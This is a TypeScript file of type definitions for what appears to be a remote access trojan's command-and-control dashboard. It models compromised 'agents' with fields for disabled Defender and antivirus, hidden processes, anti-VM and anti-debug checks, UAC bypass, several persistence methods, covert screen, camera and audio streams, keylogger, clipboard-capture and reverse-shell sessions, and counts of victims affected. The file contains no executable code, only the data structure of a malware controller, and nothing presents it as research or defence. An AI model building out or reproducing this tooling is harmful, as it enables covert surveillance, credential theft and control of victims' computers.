export interface Agent {
  id: string;
  hostname: string;
  ip: string;
  os: string;
  status: 'online' | 'offline' | 'connecting';
  lastSeen: string;
  capabilities: string[];
  streams: {
    screen: boolean;
    camera: boolean;
    audio: boolean;
  };
  persistence: {
    registry: boolean;
    startup: boolean;
    scheduledTasks: boolean;
    services: boolean;
  };
  security: {
    defenderDisabled: boolean;
    avDisabled: boolean;
    processHidden: boolean;
    antiVm: boolean;
    antiDebug: boolean;
  };
  privileges: {
    admin: boolean;
    uacBypassed: boolean;
    method: string;
  };
}

export interface StreamSession {
  id: string;
  agentId: string;
  type: 'screen' | 'camera' | 'audio';
  status: 'active' | 'inactive' | 'starting' | 'stopping';
  quality: {
    bitrate: number;
    fps: number;
    resolution: string;
    droppedFrames: number;
  };
  webrtc: {
    connectionState: string;
    iceConnectionState: string;
    signalingState: string;
  };
}

export interface SecurityStatus {
  defenderStatus: 'disabled' | 'enabled' | 'unknown';
  avStatus: 'disabled' | 'enabled' | 'unknown';
  processStatus: 'hidden' | 'visible' | 'unknown';
  vmDetection: boolean;
  debuggerDetection: boolean;
}

export interface PersistenceStatus {
  registry: { active: boolean; count: number };
  startup: { active: boolean; count: number };
  scheduledTasks: { active: boolean; count: number };
  services: { active: boolean; count: number };
}

export interface UACBypassMethod {
  name: string;
  description: string;
  status: 'available' | 'active' | 'failed';
  riskLevel: 'low' | 'medium' | 'high';
}

export interface FileTransfer {
  id: string;
  agentId: string;
  filename: string;
  size: number;
  progress: number;
  direction: 'upload' | 'download';
  status: 'pending' | 'active' | 'completed' | 'failed';
  speed: number;
}

export interface KeyloggerSession {
  id: string;
  agentId: string;
  status: 'active' | 'inactive';
  startTime: string;
  keyCount: number;
  lastActivity: string;
}

export interface ClipboardSession {
  id: string;
  agentId: string;
  status: 'active' | 'inactive';
  startTime: string;
  clipboardCount: number;
  lastClipboard: string;
}

export interface ReverseShellSession {
  id: string;
  agentId: string;
  status: 'active' | 'inactive';
  startTime: string;
  commandCount: number;
  lastCommand: string;
}

export interface DashboardMetrics {
  agents: {
    total: number;
    online: number;
    offline: number;
    problems: number;
    errors: number;
    bugs: number;
  };
  streams: {
    active: number;
    total: number;
    avgBitrate: number;
    avgFps: number;
  };
  security: {
    defenderDisabled: number;
    avDisabled: number;
    processesHidden: number;
    uacBypassed: number;
  };
  persistence: {
    registryMethods: number;
    startupMethods: number;
    scheduledTasks: number;
    serviceMethods: number;
  };
  controller: {
    uptime: number;
    avgLatency: number;
    totalConnections: number;
    serviceHealth: number;
  };
}